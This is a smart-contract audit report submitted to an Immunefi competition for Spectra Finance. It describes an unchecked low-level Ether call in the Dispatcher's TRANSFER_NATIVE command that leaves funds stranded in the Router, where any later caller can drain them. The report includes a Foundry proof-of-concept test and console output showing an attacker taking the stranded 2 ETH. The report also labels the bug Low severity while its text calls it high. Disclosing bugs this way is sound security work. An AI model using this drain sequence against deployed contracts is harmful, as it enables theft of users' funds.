# #44173 \[SC-Low] Unchecked Low-Level Call in TRANSFER\_NATIVE in \`Dispatcher::\_dispatch\` Can Lead to Locked Ether and Potential Theft

**Submitted on Apr 17th 2025 at 13:38:42 UTC by @roccomania for** [**Audit Comp | Spectra Finance**](https://immunefi.com/audit-competition/audit-comp-spectra-finance)

* **Report ID:** #44173
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/Spectra-Audit-Competition/blob/main/src/router/Dispatcher.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

**The Dispatcher contract**, intended to be inherited by the Router, handles native Ether transfers using a low-level `.call` without verifying the success of the operation. If a user attempts to send Ether via the `TRANSFER_NATIVE` command to a recipient contract unable to receive Ether (e.g., lacking a receive/fallback function or reverting on receipt), the transfer will fail silently. The Ether will remain trapped within the inheriting Router contract, making it inaccessible to the intended recipient and vulnerable to theft by any subsequent user who calls the `execute` function with a `TRANSFER_NATIVE` command directed to an address capable of receiving Ether.

***

### Vulnerability Details

Within the `_dispatch` function in `Dispatcher.sol`, the `TRANSFER_NATIVE` command is handled as follows:

```solidity
// src/router/Dispatcher.sol

} else if (command == Commands.TRANSFER_NATIVE) {
    (address recipient, uint256 amount) = abi.decode(_inputs, (address, uint256));
    // @audit-issue if call is sent to recipient that does not have receive or callback,
    // funds will get stucked in the router inheriting the contract.
    // Then an attacker can later call execute and set himself as recipient to steal the fund
    (bool success,) = payable(recipient).call{value: amount}("");
} else {
    revert InvalidCommandType(command);
}
```

The critical issue lies in the line:\
`(bool success,) = payable(recipient).call{value: amount}("");`

This code performs a raw call to send Ether but **crucially ignores the success boolean** returned by the call. According to Solidity documentation and best practices, the return value of low-level calls like `.call`, `.delegatecall`, and `.staticcall` must always be checked.

If the recipient address is a contract that:

* Does not have a `payable fallback` function.
* Does not have a `receive()` function.
* Has a `receive()` or `payable fallback` function that reverts (e.g., due to internal logic, insufficient gas forwarded, etc.).

Then the `.call` will return `success = false`. Because this return value is not checked, the `_dispatch` function (and therefore the `execute` function in the inheriting Router) will continue execution **as if the transfer succeeded**. However, the Ether (`amount`) will not have been sent to the recipient. Instead, it remains held by the contract that executed the code – the Router contract instance.

***

### Impact Details

The immediate impact is that the intended Ether transfer **fails silently**, and the funds become **locked within the Router contract**. The original sender might believe the transfer succeeded, while the intended recipient never receives the funds.

The more severe impact is the **potential for theft**. Since the Ether is now held by the Router contract, any user can subsequently call the `execute` function on the Router. They can include a `TRANSFER_NATIVE` command in their sequence, specifying:

* An amount up to the Ether balance held by the Router, and
* A recipient address they control (or any address that can receive Ether).

Because the Router now holds the previously locked Ether, this subsequent transfer will succeed, effectively draining the locked funds to an address chosen by the second caller.

This constitutes a **direct loss of funds** originally intended for a specific recipient, which are instead **stolen by an opportunistic user** interacting with the Router later. The severity is **high** as it allows any user to **steal Ether** that becomes inadvertently locked in the contract due to failed transfers.

## Proof of Concept

* Create a contract without a receive or callback, and add it to `test/Router/RouterTest.t.sol`

```solidity
contract VulnerableContract{
    function isNaive() public pure returns (bool){
        return true;
    }
}
```

* Create a new test function to the same file

```solidity
    function testNativeTransferBug() public {
        address innocentUser = makeAddr("INNOCENT_USER");
        address attacker = makeAddr("ATTACKER");
        // address recipient = makeAddr("RECIPIENT");

        VulnerableContract vulnerableContract = new VulnerableContract();

        uint256 amount = 2e18;
        deal(innocentUser, amount);
        bytes memory commands = abi.encodePacked(bytes1(uint8(Commands.TRANSFER_NATIVE)));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(address(vulnerableContract), amount);

        uint256 etherBalOfInnocentUserBefore = innocentUser.balance;
        uint256 etherBalOfAttackerBefore = attacker.balance;
        uint256 etherBalOfVulnerableContractBefore = address(vulnerableContract).balance;
        uint256 etherBalOfRouterBefore = address(router).balance;
        console.log("Innocent User Balance Before", etherBalOfInnocentUserBefore);
        console.log("Attacker Balance Before", etherBalOfAttackerBefore);
        console.log("VulnerableContract Balance Before", etherBalOfVulnerableContractBefore);
        console.log("Router Balance Before", etherBalOfRouterBefore);

        vm.prank(innocentUser);
        router.execute{value:amount}(commands, inputs);

        uint256 etherBalOfInnocentUserAfterInnocentUser = innocentUser.balance;
        uint256 etherBalOfVulnerableContractAfterInnocentUser = address(vulnerableContract).balance;
        uint256 etherBalOfAttackerAfterInnocentUser = attacker.balance;
        uint256 etherBalOfRouterAfterInnocentUser = address(router).balance;

        console.log("Innocent User Balance After Innocent User", etherBalOfInnocentUserAfterInnocentUser);
        console.log("Attacker Balance After Innocent User", etherBalOfAttackerAfterInnocentUser);
        console.log("VulnerableContract Balance After Innocent User", etherBalOfVulnerableContractAfterInnocentUser);
        console.log("Router Balance After Innocent User", etherBalOfRouterAfterInnocentUser);

        inputs[0] = abi.encode(attacker, amount);

        vm.prank(attacker);
        router.execute(commands, inputs);

         uint256 etherBalOfInnocentUserAfterAttacker = innocentUser.balance;
        uint256 etherBalOfVulnerableContractAfterAttacker = address(vulnerableContract).balance;
        uint256 etherBalOfAttackerAfterAttacker = attacker.balance;
        uint256 etherBalOfRouterAfterAttacker = address(router).balance;

        console.log("Innocent User Balance After", etherBalOfInnocentUserAfterAttacker);
        console.log("Attacker Balance After", etherBalOfAttackerAfterAttacker);
        console.log("VulnerableContract Balance After", etherBalOfVulnerableContractAfterAttacker);
        console.log("Router Balance After", etherBalOfRouterAfterAttacker);

        
    }
```

* Now run the test with `forge test --mt testNativeTransferBug -vvv` Here is the result

```console
  Innocent User Balance Before 2000000000000000000
  Attacker Balance Before 0
  VulnerableContract Balance Before 0
  Router Balance Before 0
  Innocent User Balance After Innocent User 0
  Attacker Balance After Innocent User 0
  VulnerableContract Balance After Innocent User 0
  Router Balance After Innocent User 2000000000000000000
  Innocent User Balance After 0
  Attacker Balance After 2000000000000000000
  VulnerableContract Balance After 0
  Router Balance After 0
```
